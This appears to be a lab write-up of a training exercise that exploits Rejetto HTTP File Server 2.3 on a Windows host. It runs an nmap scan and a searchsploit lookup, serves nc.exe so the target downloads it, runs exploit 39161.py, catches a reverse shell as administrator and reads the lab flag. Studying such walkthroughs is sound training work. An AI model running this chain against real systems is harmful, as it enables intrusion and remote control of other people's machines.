```
root@attackdefense:~# cat /root/Desktop/target 
Target IP Address : 10.5.27.98
root@attackdefense:~# nmap -sV -O 10.5.27.98
Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-11 12:22 IST
Nmap scan report for 10.5.27.98
Host is up (0.0025s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49176/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=8/11%OT=80%CT=1%CU=30997%PV=Y%DS=3%DC=I%G=Y%TM=64D5DAF
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M546NW8ST11%O2=M546NW8ST11%O3=M546NW8NNT11%O4=M546NW8ST11%O5=M5
OS:46NW8ST11%O6=M546ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=7F%W=2000%O=M546NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=7F%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=7F%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=7F%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=7F%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=7F%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=7F%CD=Z)

Network Distance: 3 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.80 seconds
```

Opened the browser to check if the file server is actually running. And we found it is rejetto file server 2.3

```
root@attackdefense:~# searchsploit http file server 2.3
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                       |  Path
                                                                                                                                                     | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                       | exploits/multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                  | exploits/windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                  | exploits/windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                             | exploits/windows/webapps/34852.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result

root@attackdefense:~# cd Desktop/     
root@attackdefense:~/Desktop# searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /root/Desktop/39161.py
```

Now that we have the exploit code we need to read the code once and try to change the host IP address and understand the code. In this case it is clearly mentioned in the EDB notes that for the exploit code to work effective we do have a condition where the nc.exe binary should be on webserver so that it can be downloaded on to the target machine and start a reverse shell.

```
root@attackdefense:~/Desktop# cp /usr/share/windows-resources/binaries/nc.exe .
root@attackdefense:~/Desktop# ls
 39161.py	      README			    lxterminal.desktop	 target   wireshark.desktop
'Copy-Paste README'   lxqt-config-monitor.desktop   nc.exe		 tools	  wordlists
root@attackdefense:~/Desktop# python -m SimpleHTTPServer 80 
Serving HTTP on 0.0.0.0 port 80 ...
10.5.27.98 - - [11/Aug/2023 12:36:01] "GET /nc.exe HTTP/1.1" 200 -
10.5.27.98 - - [11/Aug/2023 12:36:01] "GET /nc.exe HTTP/1.1" 200 -
10.5.27.98 - - [11/Aug/2023 12:36:01] "GET /nc.exe HTTP/1.1" 200 -
10.5.27.98 - - [11/Aug/2023 12:36:01] "GET /nc.exe HTTP/1.1" 200 -
10.5.27.98 - - [11/Aug/2023 12:36:22] "GET /nc.exe HTTP/1.1" 200 -
10.5.27.98 - - [11/Aug/2023 12:36:22] "GET /nc.exe HTTP/1.1" 200 -
10.5.27.98 - - [11/Aug/2023 12:36:22] "GET /nc.exe HTTP/1.1" 200 -
10.5.27.98 - - [11/Aug/2023 12:36:22] "GET /nc.exe HTTP/1.1" 200 -
```

```
root@attackdefense:~# nc -nlvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.5.27.98.
Ncat: Connection from 10.5.27.98:49499.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\hfs>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\hfs>whoami
whoami
win-omcnbkr66mn\administrator

C:\hfs>systeminfo
systeminfo

Host Name:                 WIN-OMCNBKR66MN
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00252-70000-00000-AA535
Original Install Date:     9/10/2020, 9:10:37 AM
System Boot Time:          8/11/2023, 6:46:24 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     1,024 MB
Available Physical Memory: 473 MB
Virtual Memory: Max Size:  9,216 MB
Virtual Memory: Available: 8,462 MB
Virtual Memory: In Use:    754 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WIN-OMCNBKR66MN
Hotfix(s):                 208 Hotfix(s) Installed.
                           [01]: KB2894856
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2919442
                           [05]: KB2934520
                           [06]: KB2938066
                           [07]: KB2938772
                           [08]: KB2949621
C:\hfs>cd /
cd /

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\

09/14/2020  06:52 AM                32 flag.txt
08/11/2023  06:48 AM    <DIR>          hfs
08/22/2013  03:52 PM    <DIR>          PerfLogs
08/12/2020  04:13 AM    <DIR>          Program Files
09/05/2020  09:05 AM    <DIR>          Program Files (x86)
09/10/2020  09:50 AM    <DIR>          Users
09/14/2020  06:49 AM    <DIR>          Windows
               1 File(s)             32 bytes
               6 Dir(s)   9,315,770,368 bytes free

C:\>type flag.txt
type flag.txt
f74c8347798f4082daf4b4570dba094a
```

```
root@attackdefense:~/Desktop# python 39161.py 10.5.27.98 80
root@attackdefense:~/Desktop# vi 39161.py 
root@attackdefense:~/Desktop# python 39161.py 10.5.27.98 80
root@attackdefense:~/Desktop# python 39161.py 10.5.27.98 80
root@attackdefense:~/Desktop#
```

